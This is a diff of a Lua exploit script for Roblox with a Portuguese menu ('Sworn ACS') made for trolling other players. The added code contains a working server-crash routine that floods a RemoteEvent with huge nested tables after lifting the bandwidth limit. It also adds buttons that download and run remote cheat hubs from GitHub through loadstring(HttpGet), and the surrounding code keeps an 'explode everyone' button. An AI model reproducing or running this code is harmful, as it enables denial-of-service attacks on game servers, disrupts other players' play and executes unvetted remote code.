@@ -1,8 +1,9 @@
 local UILib = loadstring(game:HttpGet('https://raw.githubusercontent.com/StepBroFurious/Script/main/HydraHubUi.lua'))()
 local Window = UILib.new("Sworn ACS", game.Players.LocalPlayer.UserId, "Buyer")
 local Category1 = Window:Category("Principal", "http://www.roblox.com/asset/?id=8395621517")
-local SubButton1 = Category1:Button("Combate", "http://www.roblox.com/asset/?id=8395747586")
-local Section1 = SubButton1:Section("Seção", "Left")
+local SubButton1 = Category1:Button("Troll", "http://www.roblox.com/asset/?id=8395747586")
+local Section1 = SubButton1:Section("ACS", "Left")
+local Section2 = SubButton1:Section("Menu", "Right")
 Section1:Button({
     Title = "Explode todo mundo",
     ButtonName = "Explodir todo mundo",
@@ -34,10 +35,77 @@ Section1:Button({
 end)
 
 Section1:Button({
-    Title = "Abre menu de construções",
-    ButtonName = "Abre menu de construções",
-    Description = "Abre menu de construções",
+    Title = "Crashar Servidor",
+    ButtonName = "Crashar Servidor",
+    Description = "Crashar Servidor",
 }, function(value)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/jacrai/stormfun/main/1.6'))())
+    local char = game:GetService('Players').LocalPlayer.Character or nil
+    if char then
+    char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+    task.wait(0.5)
+    char.HumanoidRootPart.Anchored = true
+    end
+    while wait(0.6) do --// don't change it's the best
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+    
+    local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+    
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+    
+    if calculatemax then
+         maximum = calculatemax
+         else
+         maximum = 999999
+    end
+    
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+    
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+    end
+    
+    bomb(250, 2) --// change values if client crashes
+
+Section2:Button({
+    Title = "Parvus Hub",
+    ButtonName = "Parvus Hub",
+    Description = "Abre ACS Troll Menu",
+}, function(value)
+    local IsDevelopmentBranch,NotificationTime = false,5
+    local Branch = IsDevelopmentBranch and "development" or "main"
+    local Source = "https://raw.githubusercontent.com/AlexR32/Parvus/" .. Branch .. "/"
+    loadstring(game:HttpGet(Source .. "Loader.lua"),"Loader")(Branch,NotificationTime)
 end)
- 
+
+
+Section2:Button({
+    Title = "ACS Hub V1",
+    ButtonName = "ACS Hub V1",
+    Description = "ACS Hub V1",
+}, function(value)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/StoneDev47/KLB-HUB---ACS/main/mainhub", true))()
+end)
+
